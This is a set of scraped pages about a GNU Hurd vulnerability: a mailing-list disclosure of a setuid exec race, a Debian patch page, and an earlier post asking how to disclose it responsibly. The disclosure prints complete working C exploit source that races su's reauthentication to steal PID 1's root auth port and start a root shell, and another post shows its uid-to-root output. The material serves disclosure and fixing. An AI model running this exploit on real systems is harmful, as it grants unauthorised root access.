=== Content from www.mail-archive.com_2f71e31f_20250115_100107.html ===


[Skip to site navigation (Press enter)](#nav)

# [[VULN 3/4] setuid exec race](/search?l=bug-hurd@gnu.org&q=subject:%22%5C%5BVULN+3%5C%2F4%5C%5D+setuid+exec+race%22&o=newest)

[Sergey Bugaev](/search?l=bug-hurd@gnu.org&q=from:%22Sergey+Bugaev%22)
[Tue, 02 Nov 2021 09:36:22 -0700](/search?l=bug-hurd@gnu.org&q=date:20211102)

```
Short description
=================

When trying to exec a setuid executable, there's a window of time when the
process already has the new privileges, but still refers to the old task and is
accessible through the old process port. This can be exploited to get full root
access to the system.
```
```

Background: setuid exec
=======================

setuid is of course the Unix mechanism for raising privileges, whereby a
process, upon executing a specially-marked executable file, is given the
privileges of the owner of the file (typically root).

On the Hurd, this is implemented as follows:

* A process wishing to exec an executable file calls file_exec_paths () on the
  file, effectively asking the translator that provides the file to call
  exec_exec_paths () on the task.

* If the translator wants to implement setuid behavior for the file, it
  reauthenticates the process and the provided I/O ports (file descriptors and
  cwd) to the new set of UIDs.

* The translator calls exec_exec_paths (), passing the new ports to the exec
  server along with the EXEC_SECURE flag. The EXEC_SECURE flag instructs the
  exec server to load the executable into a fresh new task that's not accessible
  to the original task, instead of reusing the same task as it does otherwise.
  (Technically, that's what EXEC_NEWTASK, which is implied by EXEC_SECURE, does;
  EXEC_SECURE enables some additional tweaks on top of that.)

* If loading the executable into the new task succeeds, the exec server calls
  proc_reassign (), which kills off the old task, assigns the new task to the
  process, and also invalidates the old process port (the process port created
  for the new task becomes the new port of the process). As far as the Mach
  personality of the system is concerned, this is a fresh new task with a fresh
  new process port; but since it keeps all the process state, from the Unix
  point of view it's still the same process, only running a new executable.

The use of a fresh task (and recreation of the process port) is necessary
because unprivileged processes have access to the task and process port of the
original process; they would get access to the new privileged process if the
task and/or process ports were kept valid.

Please note that the exec server is (almost) not involved in the actual process
of changing UIDs, that's entirely up to the translator to do -- and translators
could implement different semantics than Unix setuid.

The issue
=========

The reauthenticated I/O ports are only given out to the new task if the exec
succeeds. But reauthenticating the process does not create a new reauthenticated
process, it only changes authentication of the same process. The process is
still accessible to the process itself, and to anyone else who has access to the
task or process port. Some time later, if the exec succeeds, the task is killed
and the process port is invalidated. During the window of time between these two
events, the process is still accessible through the old task and process ports,
but already has the new (root) privileges.

Moreover, this window of time can be easily made arbitrarily long, since the
translator (specifically, the exec_reauth () function in libshouldbeinlibc)
proceeds to reauthenticate the cwd port after reauthenticating the process. So
by the time a io_reauthenticate () request is received on the cwd port, the
process should already be reauthenticated, _and_ we know the process port won't
be invalidated before io_reauthenticate () returns.

The exploit
===========

We create two tasks, one that will set its cwd to a fresh port (which only has
to _not_ reply to the incoming message) and start to exec a setuid executable;
the other task will get access to the process of the first task and wait until
that process is given root privileges (as far as the proc server is concerned).

>From here on, it's simple to get actual full root access (that is, a root auth
port). We get access to a task of some process that already runs as full root (I
chose PID 1), and just ask it nicely to give us its auth port using
msg_get_init_port (INIT_PORT_AUTH).

Exploit source code
===================

#include <stdio.h>
#include <error.h>
#include <hurd.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <hurd/paths.h>
#include <hurd/msg.h>

int
main ()
{
  error_t err;
  pid_t child_pid;
  process_t child_proc;
  task_t pid1_task;
  mach_port_t pid1_msgport;
  auth_t root_auth;

  child_pid = fork ();
  if (child_pid < 0)
    error (1, errno, "fork");

  if (child_pid == 0)
    {
      file_t fake_cwdir;

      sleep (1);

      err = mach_port_allocate (mach_task_self (), MACH_PORT_RIGHT_RECEIVE,
                                &fake_cwdir);
      if (err)
        error (1, errno, "mach_port_allocate");

      err = mach_port_insert_right (mach_task_self (), fake_cwdir,
                                    fake_cwdir, MACH_MSG_TYPE_MAKE_SEND);
      if (err)
        error (1, errno, "mach_port_insert_right");

      _hurd_port_set (&_hurd_ports[INIT_PORT_CWDIR], fake_cwdir);

      execlp ("su", "su", NULL);
      error (1, errno, "execlp");
    }

  err = proc_pid2proc (getproc(), child_pid, &child_proc);
  if (err)
    error (1, err, "pid2proc");

  sleep (2);

  err = proc_pid2task (child_proc, 1, &pid1_task);
  if (err)
    error (1, err, "proc_pid2task");

  err = proc_getmsgport (child_proc, 1, &pid1_msgport);
  if (err)
    error (1, err, "proc_getmsgport");

  /* Kill the hanging child task, we no longer need it.  */
  kill (child_pid, SIGKILL);

  err = msg_get_init_port (pid1_msgport, pid1_task,
                           INIT_PORT_AUTH, &root_auth);
  if (err)
    error (1, err, "msg_get_init_port");

  fprintf (stderr, "Got root auth port :)\n");

  err = setauth (root_auth);
  if (err)
    error (1, err, "setauth");

  if (setresuid (0, 0, 0) < 0)
    error (0, errno, "setresuid");
  if (setresgid (0, 0, 0) < 0)
    error (0, errno, "setresgid");

  execl ("/bin/bash", "/bin/bash", NULL);
  error (1, errno, "failed to exec bash");
}

Notes
=====

Actually, the situation is more complicated due to the "process owner" feature.
This feature turned out to itself cause problems and vulnerabilities, so I ended
up removing it altogether. The patch [0] has more details.

[0]:
<https://salsa.debian.org/hurd-team/hurd/-/blob/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian/patches/0034-proc-Use-UIDs-for-evaluating-permissions.patch>

The setuid exec implementation is naturally a promising target to attack, since
it involves raising privileges, and implementing _that_ correctly can be
problematic even in monolithic systems -- typically, some sort of ptrace access
would not be invalidated atomically with raising privileges. Here are two
examples of that in SerenityOS [1] [2], and here's a XNU vulnerability [3]
involving setuid exec and task ports. This only becomes more challenging to do
correctly in a distributed system like the Hurd, as several pieces of state,
kept by various servers, all need to be updated as a part of setuid exec.

[1]: <https://hxp.io/blog/79/hxp-CTF-2020-wisdom2/>
[2]: <https://github.com/SerenityOS/serenity/issues/5230>
[3]: <https://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html>

It is quite likely that there still are more undiscovered issues in the setuid
exec implementation.

How we fixed the vulnerability
==============================

I've made the case that all the three actions that the process server does:

* reauthenticating the process
* assigning a new task to the process
* invalidating the old process port

have to be done atomically. Making any one of them earlier (or later) than
others opens up a possibility for exploitation. To this end, we've introduced a
new RPC to do all three atomically:

/* Change the current authentication of the process and assign a different
   task to it, atomically.  The user should follow this call with a call to
   auth_user_authenticate.  The new_port passed back through the auth server
   will be the new proc port.  The old proc port is destroyed.  */
simpleroutine proc_reauthenticate_reassign (
        old_process: process_t;
        rendezvous: mach_port_send_t;
        new_task: task_t);

The exec server and exec_reauth () have then been updated to call this new RPC
instead of the old proc_reassign () and proc_reauthenticate ().

```

* [Previous message](msg32117.html)
* [View by thread](index.html#32112)
* [View by date](maillist.html#32112)
* [Next message](msg32113.html)

* [[VULN 0/4] Hurd vulnerability details](msg32117.html) Sergey Bugaev
* + [VULN 3/4] setuid exec race Sergey Bugaev
  + [[VULN 2/4] No read-only mappings](msg32113.html) Sergey Bugaev
  + [[VULN 4/4] Process auth man-in-the-middle](msg32114.html) Sergey Bugaev
  + - [Re: [VULN 4/4] Process auth man-in-the-middle](msg32122.html) William ML Leslie
    - * [Re: [VULN 4/4] Process auth man-in-the-midd...](msg32123.html) Samuel Thibault
      * [Re: [VULN 4/4] Process auth man-in-the-midd...](msg32124.html) Samuel Thibault
      * + [Re: [VULN 4/4] Process auth man-in-the-...](msg32125.html) William ML Leslie
        + [Re: [VULN 4/4] Process auth man-in-the-...](msg32126.html) Sergey Bugaev
        + - [Re: [VULN 4/4] Process auth man-in...](msg32127.html) William ML Leslie
          - * [Re: [VULN 4/4] Process auth ma...](msg32128.html) Sergey Bugaev
  + [[VULN 1/4] Fake notifications](msg32116.html) Sergey Bugaev

## Reply via email to

[![The Mail Archive](/logo.png)](/)

Search the site

* [The Mail Archive home](/)
* [bug-hurd - all messages](/bug-hurd%40gnu.org/)
* [bug-hurd - about the list](/bug-hurd%40gnu.org/info.html)
* [Expand](/search?l=bug-hurd@gnu.org&q=subject:%22%5C%5BVULN+3%5C%2F4%5C%5D+setuid+exec+race%22&o=newest&f=1 "e")
* [Previous message](msg32117.html "p")
* [Next message](msg32113.html "n")

* [The Mail Archive home](/)
* [Add your mailing list](/faq.html#newlist)
* [FAQ](/faq.html)
* [Support](/faq.html#support)
* [Privacy](/faq.html#privacy)
* 20211102163121.415934-4-bugaevc@gmail.com



=== Content from salsa.debian.org_2a0243a1_20250115_100107.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Register](/users/sign_up)

* [hurd](/hurd-team/hurd/-/tree/4d1b079411e2f40576e7b58f9b5b78f733a2beda)
* [debian](/hurd-team/hurd/-/tree/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian)
* [patches](/hurd-team/hurd/-/tree/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian/patches)
* [**0034-proc-Use-UIDs-for-evaluating-per...**](/hurd-team/hurd/-/blob/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian/patches/0034-proc-Use-UIDs-for-evaluating-permissions.patch)

Find file

[Blame](/hurd-team/hurd/-/blame/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian/patches/0034-proc-Use-UIDs-for-evaluating-permissions.patch)
[History](/hurd-team/hurd/-/commits/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian/patches/0034-proc-Use-UIDs-for-evaluating-permissions.patch)
[Permalink](/hurd-team/hurd/-/blob/4d1b079411e2f40576e7b58f9b5b78f733a2beda/debian/patches/0034-proc-Use-UIDs-for-evaluating-permissions.patch "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![Samuel Thibault's avatar](https://seccdn.libravatar.org/avatar/fff265e7cec4e803a5627a6e839d72cc8f80ab86533031c5d4411da3aacea5e3?s=128&d=identicon&gravatarproxy=n "Samuel Thibault")](/sthibault)

  [Fix security issues](/hurd-team/hurd/-/commit/e3cbcd4b8f37e7b5c65ea262b3abd5c1661883c6)
  ·
  e3cbcd4b

  [Samuel Thibault](/sthibault) authored Aug 06, 2021
  ```

    * patches/00*: Fix dead-name notification and reauthentication security
      issues.
      - control: Force libc0.3 upgrade.
    * patches/newRPC.patch: Fix build until glibc gets rebuilt.
  ```

  e3cbcd4b

Loading



=== Content from lists.gnu.org_9957dd8f_20250115_100106.html ===


| | **bug-hurd** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=bug-hurd)

---

[[Date Prev](msg00078.html)][[Date Next](msg00080.html)][[Thread Prev](msg00073.html)][[Thread Next](msg00080.html)][[Date Index](index.html#00079)][[Thread Index](threads.html#00079)]

## How do I disclose a vulnerability?

---

| **From**: | Sergey Bugaev |
| --- | --- |

| **Subject**: | How do I disclose a vulnerability? |
| **Date**: | Fri, 14 May 2021 14:46:36 +0300 |

---

```
As luck would have it, I have found a serious issue in a core
component of the Hurd. It is a denial of service, which can then be
turned into privilege escalation.

I have developed an exploit. Here is it in action:

sergey@sergey-hurd-box:~/hax$ id
uid=1000(sergey) gid=1000(sergey)
groups=1000(sergey),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),103(netdev)
sergey@sergey-hurd-box:~/hax$ ./hax
Got root auth port :)
root@sergey-hurd-box:~/hax# id
uid=0(root) gid=0(root) groups=0(root)
root@sergey-hurd-box:~/hax#

(To be clear, I'm not the first person to realize that, let's say,
_this way of doing things_ could be exploited. I just stumbled on a
piece of code, realized that it uses a problematic pattern, thought of
possible ramifications, and developed the specific exploit.)

As far as I can see from Git history, this vulnerability has been
present in the code base for more than 20 years. Is such a
vulnerability already known (and am I just late to the party)?

If it's not known, how do I responsibly disclose this, so that
nobody's system gets hacked? I guess I could send the vulnerability
description and the exploit source code in a private e-mail; is there
perhaps a dedicated GNU e-mail address for this purpose? How do we
ensure that a future commit fixing the vulnerability doesn't
immediately disclose what it was?

Or, should I just dump the whole thing out in the open on this mailing list?

Should we get a CVE ID assigned? Should we notify Debian?

Sergey

P. S. On a personal note, it has been *very* exciting to find the
issue and develop a successful exploit! But now I'm a bit lost as to
what to do next.

And sorry for throwing more stuff at you. This can certainly wait for
a few more days if it hasn't been discovered for 20 years.

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg00080.html)] |
| --- | --- | --- |

* **How do I disclose a vulnerability?**,
  *Sergey Bugaev* **<=**
  + **[Re: How do I disclose a vulnerability?](msg00080.html)**, *Samuel Thibault*, 2021/05/14
    - **[Re: How do I disclose a vulnerability?](msg00081.html)**, *Sergey Bugaev*, 2021/05/14
      * **[Re: How do I disclose a vulnerability?](msg00082.html)**, *Samuel Thibault*, 2021/05/14
      * **[Re: How do I disclose a vulnerability?](msg00094.html)**, *Sergey Bugaev*, 2021/05/18

---

* Prev by Date:
  **[Re: rpctrace output improvements?](msg00078.html)**
* Next by Date:
  **[Re: How do I disclose a vulnerability?](msg00080.html)**
* Previous by thread:
  **[rpctrace output improvements?](msg00073.html)**
* Next by thread:
  **[Re: How do I disclose a vulnerability?](msg00080.html)**
* Index(es):
  + [**Date**](index.html#00079)
  + [**Thread**](threads.html#00079)


